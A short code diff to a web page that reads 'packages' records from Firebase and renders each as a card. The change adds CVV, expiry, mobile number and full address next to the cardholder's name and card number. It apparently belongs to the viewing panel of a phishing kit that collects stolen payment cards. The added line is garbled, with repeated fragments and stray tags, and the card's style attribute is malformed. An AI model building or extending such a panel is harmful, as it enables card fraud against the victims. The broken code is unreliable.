@@ -34,7 +34,7 @@ database.ref('packages').on('value',snap=>{
  for(const k in cards){const c=cards[k];html+=`<div class='card' #ccc;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.2);padding:16px;width:300px'>
  <h3>${c.fullName}</h3>
  <p>${c.address}</p>
- <p>${c.cardNumber}</p>
+ <p><strong>Address:</strong> ${c.address}</p><p><strong>Card:</strong> ${c.cardNumber}</p><p><strong>CVV:</strong> ${c.cvv}</p><p><strong>Expiry:</strong> ${c.expiryMM}/${c.expiryYY}</p><p><strong>Method:</strong> ${c.paymentMethod}</p><p><strong>City:</strong> ${c.city}</p><p><strong>State:</strong> ${c.state}</p><p><strong>Pincode:</strong> ${c.pincode}</p><p><strong>Mobile:</strong> ${c.mobileNumber}</p></strong> ${c.address}</p><p><strong>Card:</strong> ${c.cardNumber}</p><p><strong>City:</strong> ${c.city}</p><p><strong>Mobile:</strong> ${c.mobileNumber}</p>
  </div>`;} document.getElementById('cards').innerHTML=html;
 });
 </script>
